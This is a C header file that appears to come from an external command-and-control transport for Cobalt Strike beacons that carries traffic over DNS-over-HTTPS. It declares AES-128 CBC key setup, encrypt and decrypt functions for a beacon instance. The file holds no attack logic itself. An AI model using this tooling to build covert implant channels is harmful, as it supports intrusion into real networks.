/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

/*-
 *
 * CryptAesInit
 *
 * Purpose:
 *
 * Creates the key object for AES
 *
-*/
DEFINESEC(B) BOOL CryptAesInit( PBEACON_INSTANCE Ins );

/*-
 *
 * CryptAesFree
 *
 * Purpose:
 *
 * Free's the associated keys for AES
 *
-*/
DEFINESEC(B) VOID CryptAesFree( PBEACON_INSTANCE Ins );

/*-
 *
 * CryptAesDecrypt
 *
 * Purpose:
 *
 * Decrypts the buffer using AES-128
 * CBC.
 *
-*/
DEFINESEC(B) BOOL CryptAesDecrypt( PBEACON_INSTANCE Ins, PVOID InOut, ULONG InOutLen );

/*-
 *
 * CryptAesEncrypt
 *
 * Purpose:
 *
 * Encrypts the buffer using AES-128
 * CBC.
 *
 * Must be padded to a multiple of
 * 16.
 *
-*/
DEFINESEC(B) BOOL CryptAesEncrypt( PBEACON_INSTANCE Ins, PVOID In, ULONG InLen, PVOID* Out, ULONG* OutLen );
